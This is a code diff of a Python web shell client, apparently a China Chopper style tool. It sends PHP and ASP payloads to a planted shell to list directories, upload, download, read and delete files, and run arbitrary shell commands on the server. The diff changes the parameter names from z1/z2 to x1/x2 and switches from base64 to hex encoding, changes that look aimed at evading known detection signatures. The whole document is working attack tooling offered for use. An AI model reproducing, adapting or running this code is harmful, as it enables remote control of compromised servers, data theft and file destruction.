@@ -7,6 +7,7 @@ import binascii
 import urllib2
 import optparse
 import string
+import locale
 import re
 session_url='http://127.0.0.1/test.php'
 session_pwd='cmd'
@@ -16,6 +17,7 @@ session_dir=''
 session_cmd=''
 session_webroot=''
 session_encoding=''
+session_default_encoding=locale.getpreferredencoding()
 def getencode():
     data1 = urllib.urlopen(session_url).read()
     chardit1 = chardet.detect(data1)
@@ -60,7 +62,7 @@ php_dir=r'''
 @set_time_limit(0);
 @set_magic_quotes_runtime(0);
 echo("->|");
-$D=$_POST["z1"];    
+$D=hexToStr($_POST["x1"]);    
 $F=@opendir($D);
 if($F==NULL){echo("ERROR:// Path Not Found Or No Permission!");}
 else{$M=NULL;$L=NULL;while($N=@readdir($F)){$P=$D."/".$N;$T=@date("Y-m-d H:i:s",@filemtime($P));
@@ -77,8 +79,8 @@ php_upload=r'''
 @set_time_limit(0);
 @set_magic_quotes_runtime(0);
 echo("->|");
-$f=$_POST["z1"];   
-$c=$_POST["z2"];    
+$f=$_POST["x1"];   
+$c=$_POST["x2"];    
 $c=str_replace("\r","",$c);
 $c=str_replace("\n","",$c);
 $buf="";
@@ -95,7 +97,7 @@ php_download=r'''
 @set_time_limit(0);
 @set_magic_quotes_runtime(0);
 echo("->|");
-$F=get_magic_quotes_gpc()?stripslashes(base64_decode($_POST["z1"])):base64_decode($_POST["z1"]);
+$F=get_magic_quotes_gpc()?stripslashes(hexToStr($_POST["x1"])):hexToStr($_POST["x1"]);
 $fp=@fopen($F,"r");
 if(@fgetc($fp)){@fclose($fp);@readfile($F);}else{echo("ERROR:// Can Not Read");};
 echo("|<-");
@@ -107,7 +109,7 @@ php_readfile=r'''
 @set_time_limit(0);
 @set_magic_quotes_runtime(0);
 echo("->|");
-$F=base64_decode($_POST["z1"]);
+$F=hexToStr($_POST["x1"]);
 $P=@fopen($F,"r");
 echo(@fread($P,filesize($F)));
 @fclose($P);
@@ -132,7 +134,7 @@ if(is_file($pf))
 $m->close();
 @chmod($p,0777);
 return @rmdir($p);}
-$F=get_magic_quotes_gpc()?stripslashes($_POST["z1"]):$_POST["z1"];
+$F=get_magic_quotes_gpc()?stripslashes(hexToStr($_POST["x1"])):hexToStr($_POST["x1"]);
 if(is_dir($F))echo(df($F));
 else{echo(file_exists($F)?@unlink($F)?"1":"0":"0");};
 echo("|<-");
@@ -145,8 +147,8 @@ php_cmd=r'''
 @set_magic_quotes_runtime(0);
 echo("->|");
 $d=dirname($_SERVER["SCRIPT_FILENAME"]);
-if(substr($d,0,1)=="/"){$p="/bin/sh";}else($p=base64_decode($_POST["z1"]));
-$s=base64_decode($_POST["z2"]);
+if(substr($d,0,1)=="/"){$p="/bin/sh";}else($p=hexToStr($_POST["x1"]));
+$s=hexToStr($_POST["x2"]);
 $d=dirname($_SERVER["SCRIPT_FILENAME"]);
 $c=substr($d,0,1)=="/"?"-c \"{$s}\"":"/c \"{$s}\"";
 $r="{$p} {$c}";
@@ -172,15 +174,15 @@ Next
 End Function
 On Error Resume Next
 Dim l,ss,ff,T
-ff=bd(request("z1"))
-ss=Request("z2")
+ff=bd(request("x1"))
+ss=Request("x2")
 l=Len(ss)
 Set S=Server.CreateObject("Adodb.Stream")
 With S
 .Type=1
 .Mode=3
 .Open
-If Request("z3")>0 Then
+If Request("x3")>0 Then
 .LoadFromFile ff
 .Position=.Size
 End If
@@ -218,7 +220,7 @@ With S
 .Mode=3
 .Type=1
 .Open
-.LoadFromFile(Request("z1"))
+.LoadFromFile(Request("x1"))
 i=0
 c=.Size
 r=1024
@@ -239,7 +241,7 @@ response.write "|<-"
 asp_readfile=r'''
 response.write "->|"
 On Error Resume Next
-Response.Write(CreateObject("Scripting.FileSystemObject").OpenTextfile(Request("z1"),1,False).readall)
+Response.Write(CreateObject("Scripting.FileSystemObject").OpenTextfile(Request("x1"),1,False).readall)
 If Err Then
 Response.Write("ERROR:// "&Err.Description)
 Err.Clear
@@ -251,7 +253,7 @@ response.write "|<-"
 asp_del=r'''
 On Error Resume Next
 Dim P
-P=Request("z1")
+P=Request("x1")
 Set FS=CreateObject("Scripting.FileSystemObject")
 If FS.FolderExists(P)=true Then
 FS.DeleteFolder(P)
@@ -273,7 +275,7 @@ End If
 asp_cmd=r'''
 response.write "->|"
 On Error Resume Next
-Set X=CreateObject("wscript.shell").exec(""""&Request("z1")&""" /c """&Request("z2")&"""")
+Set X=CreateObject("wscript.shell").exec(""""&Request("x1")&""" /c """&Request("x2")&"""")
 If Err Then
 S="[Err] "&Err.Description
 Err.Clear
@@ -291,7 +293,7 @@ asp_dir=r'''
 response.write "->|"
 On Error Resume Next
 Dim RR
-RR=Request("z1")
+RR=Request("x1")
 Function FD(dt)
 FD=Year(dt)&"-"
 If Len(Month(dt))=1 Then
@@ -343,18 +345,18 @@ response.write "|<-"
 
 def viewdir(dir):
     if(session_type=='php'):
-        data={session_pwd:binascii.b2a_hex(php_dir),'z1':dir}
+        data={session_pwd:binascii.b2a_hex(php_dir),'x1':binascii.b2a_hex(dir)}
     elif(session_type=='aspx'):
-        data={session_pwd:code1+str(bgcode)+code2+base64.b64encode(aspx_dirlist_code)+code3,'z1':dir}
+        data={session_pwd:code1+str(bgcode)+code2+binascii.b2a_hex(aspx_dirlist_code)+code3,'x1':dir}
     else:
-        data={session_pwd:binascii.b2a_hex(asp_dir),'z1':dir}        
+        data={session_pwd:binascii.b2a_hex(asp_dir),'x1':dir}        
         
  
     data=urllib.urlencode(data)
     req=urllib2.Request(session_url)
     req.add_header('User-Agent', 'Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.8.1.14) Gecko/20080404 (FoxPlus) Firefox/2.0.0.14')
     response = urllib2.urlopen(req,data)
-    content=response.read().decode(session_encoding).encode('utf-8')
+    content=response.read().decode(session_encoding).encode(session_default_encoding)
     num1=content.find('->|')+3
     num2=content.find('|<-')
     info=content[num1:num2]
@@ -367,7 +369,7 @@ def viewdir(dir):
 def upload(localfile,remotefile):
     print 'localfile:',localfile
     try:
-        remotefile=remotefile.decode('utf-8').encode(session_encoding)
+        remotefile=remotefile.decode(session_default_encoding).encode(session_encoding)
     except:
         remotefile=remotefile
     print 'remotefile:',remotefile
@@ -379,13 +381,13 @@ def upload(localfile,remotefile):
         print 'upload error:',e
 	return
     if(session_type=='php'):
-        data={session_pwd:binascii.b2a_hex(php_upload),'z1':remotefile,'z2':content}
+        data={session_pwd:binascii.b2a_hex(php_upload),'x1':remotefile,'x2':content}
         data=urllib.urlencode(data)
         req=urllib2.Request(session_url)
         req.add_header('User-Agent', 'Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.8.1.14) Gecko/20080404 (FoxPlus) Firefox/2.0.0.14')
         response = urllib2.urlopen(req,data)
         content=response.read()
-        #content=response.read().decode(session_encoding).encode('utf-8')
+        #content=response.read().decode(session_encoding).encode(session_default_encoding)
         num1=content.find('->|')+3
         num2=content.find('|<-')
         info=content[num1:num2]
@@ -396,7 +398,7 @@ def upload(localfile,remotefile):
             print "upload error!"
 
     elif(session_type=='aspx'):
-        data={session_pwd:code1+str(bgcode)+code2+base64.b64encode(aspx_upload_code)+code3,'z1':base64.b64encode(uploadfile),'z2':content}
+        data={session_pwd:code1+str(bgcode)+code2+binascii.b2a_hex(aspx_upload_code)+code3,'x1':binascii.b2a_hex(uploadfile),'x2':content}
     else:
         asp_upload_hex=binascii.b2a_hex(asp_upload)
         remotefile_hex=binascii.b2a_hex(remotefile)
@@ -405,14 +407,14 @@ def upload(localfile,remotefile):
         while temp<length:
             #print s[temp:temp+46000]
             
-            data={session_pwd:binascii.b2a_hex(asp_upload),'z1':binascii.b2a_hex(remotefile),'z2':content[temp:temp+46000],'z3':temp/2}
+            data={session_pwd:binascii.b2a_hex(asp_upload),'x1':binascii.b2a_hex(remotefile),'x2':content[temp:temp+46000],'x3':temp/2}
 
             temp=temp+46000
             data=urllib.urlencode(data)
             req=urllib2.Request(session_url)
             req.add_header('User-Agent', 'Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.8.1.14) Gecko/20080404 (FoxPlus) Firefox/2.0.0.14')
             response = urllib2.urlopen(req,data)
-            #webcontent=response.read().decode(session_encoding).encode('utf-8')
+            #webcontent=response.read().decode(session_encoding).encode(session_default_encoding)
             webcontent=response.read()
             #print webcontent
             num1=webcontent.find('->|')+3
@@ -428,23 +430,23 @@ def upload(localfile,remotefile):
 
 def download(remotefile,localfile):
     try:
-        remotefile=remotefile.decode('utf-8').encode(session_encoding)
+        remotefile=remotefile.decode(session_default_encoding).encode(session_encoding)
     except:
         remotefile=remotefile
     print 'remotefile:',remotefile
     print 'localfile:',localfile
     if(session_type=='php'):
-        data={session_pwd:binascii.b2a_hex(php_download),'z1':base64.b64encode(remotefile)}
+        data={session_pwd:binascii.b2a_hex(php_download),'x1':binascii.b2a_hex(remotefile)}
     elif(session_type=='aspx'):
-        data={session_pwd:code1+str(bgcode)+code2+base64.b64encode(aspx_upload_code)+code3,'z1':remotefile}
+        data={session_pwd:code1+str(bgcode)+code2+binascii.b2a_hex(aspx_upload_code)+code3,'x1':remotefile}
     else:
-        data={session_pwd:binascii.b2a_hex(asp_download),'z1':remotefile}     
+        data={session_pwd:binascii.b2a_hex(asp_download),'x1':remotefile}     
     data=urllib.urlencode(data)
     req=urllib2.Request(session_url)
     req.add_header('User-Agent', 'Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.8.1.14) Gecko/20080404 (FoxPlus) Firefox/2.0.0.14')
     response = urllib2.urlopen(req,data)
     content=response.read()
-    #content=response.read().decode(session_encoding).encode('utf-8')
+    #content=response.read().decode(session_encoding).encode(session_default_encoding)
     num1=content.find('->|')+3
     num2=content.find('|<-')
     info=content[num1:num2]
@@ -463,23 +465,23 @@ def download(remotefile,localfile):
 
 def readfile(filename):
     try:
-        filename=filename.decode('utf-8').encode(session_encoding)
+        filename=filename.decode(session_default_encoding).encode(session_encoding)
     except:
         filename=filename
     print 'filename:',filename
     if(session_type=='php'):
-        data={session_pwd:binascii.b2a_hex(php_readfile),'z1':base64.b64encode(filename)}
+        data={session_pwd:binascii.b2a_hex(php_readfile),'x1':binascii.b2a_hex(filename)}
     elif(session_type=='aspx'):
-        data={session_pwd:code1+str(bgcode)+code2+base64.b64encode(aspx_readfile_code)+code3,'z1':base64.b64encode(filename)}
+        data={session_pwd:code1+str(bgcode)+code2+binascii.b2a_hex(aspx_readfile_code)+code3,'x1':binascii.b2a_hex(filename)}
     else:
-        data={session_pwd:binascii.b2a_hex(asp_readfile),'z1':filename}     
+        data={session_pwd:binascii.b2a_hex(asp_readfile),'x1':filename}     
     data=urllib.urlencode(data)
     req=urllib2.Request(session_url)
     req.add_header('User-Agent', 'Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.8.1.14) Gecko/20080404 (FoxPlus) Firefox/2.0.0.14')
     #response = urllib2.urlopen(req,data)
     try:
         response = urllib2.urlopen(req,data)
-        content=response.read().decode(session_encoding).encode('utf-8')
+        content=response.read().decode(session_encoding).encode(session_default_encoding)
     except Exception,e:
         response = urllib2.urlopen(req,data)
         content=response.read()
@@ -488,33 +490,33 @@ def readfile(filename):
     num2=content.find('|<-')
     info=content[num1:num2]
     print "**************************************************************".center(50)
-    print "*****",filename.decode(session_encoding).encode('utf-8').center(50),"*****"
+    print "*****",filename.decode(session_encoding).encode(session_default_encoding).center(50),"*****"
     print "**************************************************************".center(50)
     print info
 
 def delfile(filename):
     try:
-        filename=filename.decode('utf-8').encode(session_encoding)
+        filename=filename.decode(session_default_encoding).encode(session_encoding)
     except:
         filename=filename
     if(session_type=='php'):
-        data={session_pwd:binascii.b2a_hex(php_del),'z1':filename}
+        data={session_pwd:binascii.b2a_hex(php_del),'x1':binascii.b2a_hex(filename)}
     elif(session_type=='aspx'):
-        data={session_pwd:code1+str(bgcode)+code2+base64.b64encode(aspx_del_code)+code3,'z1':filename}
+        data={session_pwd:code1+str(bgcode)+code2+binascii.b2a_hex(aspx_del_code)+code3,'x1':filename}
     else:
-        data={session_pwd:binascii.b2a_hex(asp_del),'z1':filename}     
+        data={session_pwd:binascii.b2a_hex(asp_del),'x1':filename}     
     data=urllib.urlencode(data)
     req=urllib2.Request(session_url)
     req.add_header('User-Agent', 'Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.8.1.14) Gecko/20080404 (FoxPlus) Firefox/2.0.0.14')
     response = urllib2.urlopen(req,data)
-    content=response.read().decode(session_encoding).encode('utf-8')
+    content=response.read().decode(session_encoding).encode(session_default_encoding)
     #print content
     num1=content.find('->|')+3
     num2=content.find('|<-')
     info=content[num1:num2]
     #print info
     print "**************************************************************".center(50)
-    print "*****del",filename.decode(session_encoding).encode('utf-8').center(50),"*****"
+    print "*****del",filename.decode(session_encoding).encode(session_default_encoding).center(50),"*****"
     print "**************************************************************".center(50)
     if(info=='1'):
         print "ok!"
@@ -528,26 +530,26 @@ def cmd(cmdbash="cmd.exe",command=""):
     global session_user
     
     session_cmd=cmdbash
-    cmdbash1=base64.b64encode(session_cmd)
+    cmdbash1=binascii.b2a_hex(session_cmd)
     if session_webroot[0:1]=='/':
         command="cd "+session_webroot+";"+command+';echo [directory];pwd;echo [/directory]'
     else:
         command="cd /d "+session_webroot+"&"+command+'&echo [directory]&&cd&&echo [/directory]'
-    command1=base64.b64encode(command)
+    command1=binascii.b2a_hex(command)
     if(session_type=='php'):
-        data={session_pwd:binascii.b2a_hex(php_cmd),'z1':cmdbash1,'z2':command1}
+        data={session_pwd:binascii.b2a_hex(php_cmd),'x1':cmdbash1,'x2':command1}
     #if(session_type=='aspx'):
-      #  data={session_pwd:binascii.b2a_hex(php_cmd),'z1':cmdbash1,'z2':command1}
+      #  data={session_pwd:binascii.b2a_hex(php_cmd),'x1':cmdbash1,'x2':command1}
     else:
         #print "function_cmd:",cmdbash,command
-        data={session_pwd:binascii.b2a_hex(asp_cmd),'z1':cmdbash,'z2':command}
+        data={session_pwd:binascii.b2a_hex(asp_cmd),'x1':cmdbash,'x2':command}
     #print "func_cmd:",data
     data=urllib.urlencode(data)
     req=urllib2.Request(session_url)
     req.add_header('User-Agent', 'Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.8.1.14) Gecko/20080404 (FoxPlus) Firefox/2.0.0.14')
     response = urllib2.urlopen(req,data)
     try:
-        content=response.read().decode(session_encoding).encode('utf-8')
+        content=response.read().decode(session_encoding).encode(session_default_encoding)
     except:
         content=response.read()
     num1=content.find('->|')+3
@@ -601,7 +603,7 @@ def connected():
     req=urllib2.Request(session_url)
     req.add_header('User-Agent', 'Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.8.1.14) Gecko/20080404 (FoxPlus) Firefox/2.0.0.14')
     response = urllib2.urlopen(req,data)
-    content=response.read().decode(session_encoding).encode('utf-8')
+    content=response.read().decode(session_encoding).encode(session_default_encoding)
     num1=content.find('->|')+3
     num2=content.find('|<-')
     info=content[num1:num2]
@@ -622,7 +624,7 @@ def connected():
         print "webroot:",session_webroot
         while True:
 	    action=[]
-            input_str=raw_input(session_dir.decode(session_encoding).encode('utf-8')+"@input command>:")
+            input_str=raw_input(session_dir.decode(session_encoding).encode(session_default_encoding)+"@input command>:")
 	    
             if input_str.find('[')!=-1 and input_str.find(']')!=-1:
 	        print input_str.split(' ',1)
@@ -647,10 +649,10 @@ def connected():
 		#elif input_str.split(' ',1)[1].startswith('['):
 		    #path=input_str.split(' ',1)[1]
 		    #path=path.split('[')[1].split(']')[0]
-		    #path=action[1].decode('utf-8').encode(session_encoding)
+		    #path=action[1].decode(session_default_encoding).encode(session_encoding)
 		    #changdir(path)
 		else:
-		    action[1]=action[1].decode('utf-8').encode(session_encoding)
+		    action[1]=action[1].decode(session_default_encoding).encode(session_encoding)
 		    changdir(action[1])
 	    elif len(action)==1 and action[0]=='?':
 	        functions()
@@ -658,14 +660,14 @@ def connected():
 	        if len(action)==1:
 		    viewdir(session_dir)
 		else:
-		    action[1]=action[1].decode('utf-8').encode(session_encoding)
+		    action[1]=action[1].decode(session_default_encoding).encode(session_encoding)
 		    viewdir(action[1])
             elif action[0]=='cat' and len(action)>1:
 		#if input_str.split(' ',1)[1].startswith('['):
 		    #path=input_str.split(' ',1)[1]
 		    #path=path.split('[')[1].split(']')[0]
 		    #action[1]=path
-		filename=action[1].decode('utf-8').encode(session_encoding)
+		filename=action[1].decode(session_default_encoding).encode(session_encoding)
 		if filename[0:1] in string.ascii_letters and filename[1:2]==':' or filename[0:1]=='/':
                     filename=filename
                 else:
@@ -676,7 +678,7 @@ def connected():
             elif action[0]=='down' and len(action)==3:
                 download(action[1],action[2])
             elif action[0]=='del' and len(action)==2:
-		filename=action[1].decode('utf-8').encode(session_encoding)
+		filename=action[1].decode(session_default_encoding).encode(session_encoding)
                 if filename[0:1] in string.ascii_letters and filename[1:2]==':' or filename[0:1]=='/':
                     filename=filename
                 else:
